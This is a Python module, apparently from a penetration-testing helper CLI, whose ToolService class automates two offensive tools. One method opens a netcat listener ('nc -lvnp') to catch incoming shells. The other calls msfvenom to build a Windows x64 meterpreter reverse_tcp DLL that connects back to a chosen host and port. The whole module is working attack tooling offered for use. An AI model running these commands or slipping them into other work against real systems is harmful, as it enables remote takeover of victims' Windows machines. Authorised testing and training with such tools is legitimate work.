import re

from ..cli import Context
from ..utilities.utils import Utils

# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------


class ToolService:

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def __init__(self, ctx: Context):
        self.ctx: Context = ctx
        self.utils: Utils = self.ctx.utils
        self.utils.logging.debug('tool-service is initiated')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def nc(self, port: int = 9001):
        self.utils.log_runBanner('NC')
        path = self.utils.create_service_folder('tool/nc')
        self.utils.logging.debug(f'new folder created:: {path}')

        use_sudo = ""
        if port <= 1024:
            use_sudo = "sudo"

        cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
            [use_sudo, 'nc', '-lvnp', str(port)],
            ['tee', f'{path}/nc.log']
        ])

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def msfvenom(self, host: str, port: int):
        self.utils.log_runBanner('MSFVENOM')
        path = self.utils.create_service_folder('tool/msfvenom')
        self.utils.logging.debug(f'new folder created:: {path}')

        # reverse_type = "windows/meterpreter/reverse_tcp"
        # reverse_options = ['-ax86', '-f', 'dll']
        # reverse_end = 'dll'

        reverse_type = "windows/x64/meterpreter/reverse_tcp"
        reverse_options = ['-ax64', '-f', 'dll']
        reverse_end = 'dll'

        cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
            ['msfvenom', '-p', reverse_type, f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{reverse_end}'] + reverse_options
        ])

        # with open(f'{path}/reverse_shell.{reverse_end}', 'r') as file:
        #     file.write(cmd_result)
